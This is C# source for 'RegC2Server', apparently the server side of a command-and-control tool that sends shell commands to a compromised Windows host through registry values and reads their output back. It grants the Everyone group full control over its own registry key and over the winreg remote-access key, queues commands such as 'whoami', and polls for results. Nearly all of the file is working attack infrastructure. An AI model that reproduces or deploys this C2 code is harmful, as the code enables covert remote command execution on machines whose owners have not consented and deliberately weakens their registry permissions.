using System;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;


namespace RegC2Server
{
    internal class Program
    {

        static void RunCmd(string registrykey, string cmd)
        {
            string newcmd = cmd.Substring(cmd.IndexOf(" ")).Remove(0,1);

            RegistryKey myReg;
            try
            {
                myReg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\RegistryC2\"+registrykey, true);
                myReg.SetValue("cmd", newcmd);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return;
            }
            Console.WriteLine("Cmd updated to: {0}", myReg.GetValue("cmd"));

            //Read output when available
            myReg.SetValue("output", "");
            Console.WriteLine(myReg.GetValue("output").ToString().Equals(""));
            while(true)
            {
                if (myReg.GetValue("output").ToString().Length > 0)
                {
                    Console.WriteLine(myReg.GetValue("output"));
                    break;
                }
            }
            myReg.Close();
        }

        static void UpdateSleep(string registryKey, string cmd)
        {
            string sleepTime = cmd.Split(' ')[1];
            int i = 0;
            bool isInt = int.TryParse(sleepTime, out i);

            if (!isInt)
            {
                Console.WriteLine("Please provide an int when using the sleep command");
                return;
            }
            RegistryKey myReg;
            try
            {
                myReg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\RegistryC2\" + registryKey, true);
                myReg.SetValue("sleep", i);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return;
            }
            Console.WriteLine("Sleep updated to: {0}", myReg.GetValue("sleep"));
            myReg.Close();

        }

        static void PrintHelp()
        {
            Console.WriteLine(
                "sleep 10         Sets the sleep time to 10\n" +
                "cmd whoami       Executes whoami\n" +
                "exit             Exits the application gracefully");
        }

        static void StartRemoteRegistry()
        {

        }

        static void SetupRegistryKeys(string registrykey)
        {
            //Check if the base Registry key is created (HKLM\Software\RegistryC2
            if (Registry.LocalMachine.OpenSubKey(@"SOFTWARE\RegistryC2", false) == null)
            {
                Registry.LocalMachine.CreateSubKey(@"SOFTWARE\RegistryC2");
            }

            if (Registry.LocalMachine.OpenSubKey(@"SOFTWARE\RegistryC2\" + registrykey, false) == null)
            {
                Console.WriteLine("Registry key doesn't exist. Trying to create them...");
                try
                {
                    RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\RegistryC2\" + registrykey);
                    key.SetValue("cmd", "whoami");
                    key.SetValue("output", "");
                    key.SetValue("sleep", 30);
                    key.Close();
                } catch (Exception ex)
                {
                    Console.WriteLine("Failed... : " + ex.Message);
                    Environment.Exit(0);
                }
                Console.WriteLine("[+] Registry keys created... Setting up permissions");
                ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\" + registrykey, true);
            } else
            {
                Console.WriteLine("[+] Key already exists.. Continuing...");
            }
        }

        // Set WinReg permissions
        // https://support.microsoft.com/fr-fr/topic/you-receive-an-error-message-when-you-try-to-access-the-registry-or-event-viewer-on-a-remote-computer-that-runs-windows-xp-professional-a7e41517-873e-7d10-624b-22e311b6cac1

        static void ChangeRegistryPermissions(string registrykey, bool allow)
        {

            RegistryKey myReg = Registry.LocalMachine.OpenSubKey(registrykey, RegistryKeyPermissionCheck.ReadWriteSubTree);

            SecurityIdentifier si = new SecurityIdentifier(WellKnownSidType.WorldSid, null);

            RegistrySecurity rs = myReg.GetAccessControl();

            if (allow)
            {
                try
                {
                    Console.WriteLine("[*] Applying rule to: " + myReg.Name);
                    rs.AddAccessRule(new RegistryAccessRule(si,
                    RegistryRights.WriteKey
                    | RegistryRights.ReadKey
                    | RegistryRights.Delete
                    | RegistryRights.FullControl,
                    AccessControlType.Allow));
                    myReg.SetAccessControl(rs);
                    myReg.Close();

                } catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            } else
            {
                try
                {
                    Console.WriteLine("[*] Removing rule for:" + myReg.Name);
                    rs.RemoveAccessRule(new RegistryAccessRule(si,
                    RegistryRights.WriteKey
                    | RegistryRights.ReadKey
                    | RegistryRights.Delete
                    | RegistryRights.FullControl,
                    AccessControlType.Allow));
                    myReg.SetAccessControl(rs);
                    myReg.Close();

                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }

        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                Console.WriteLine("RegC2Server.exe <Unique Registry key name to use>\n" +
                                  "RegC2Server.exe dc01");
                return;
            }

            //Catching Ctrl + C events to clean up correctly
            Console.CancelKeyPress += delegate
            {
                Console.WriteLine("[+] Closing down...");
                ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
                ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\" + args[0], false);
                //Environment.Exit(0);
            };

            Console.WriteLine("[+] Welcome to RegC2");

            Console.WriteLine("[+] Setting up permissions to WinReg...");
            ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", true);
            
            Console.WriteLine("[+] Setting up Registry keys...");
            SetupRegistryKeys(args[0]);

            Console.WriteLine("[+] Ready...");
            while (true)
            {
                Console.Write("> ");
                string cmd = Console.ReadLine();
                if (cmd == "h" || cmd == "help")
                {
                    PrintHelp();
                }

                if (cmd.StartsWith("sleep", StringComparison.OrdinalIgnoreCase))
                {
                    UpdateSleep(args[0], cmd);
                }

                if (cmd.StartsWith("cmd", StringComparison.OrdinalIgnoreCase))
                {
                    RunCmd(args[0], cmd);
                }

                if (cmd.StartsWith("exit", StringComparison.OrdinalIgnoreCase)) {
                    Console.WriteLine("[+] Closing down...");
                    ChangeRegistryPermissions(@"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg", false);
                    ChangeRegistryPermissions(@"SOFTWARE\RegistryC2\"+args[0], false);
                    Environment.Exit(0);
                }
            }

        }
    }
}
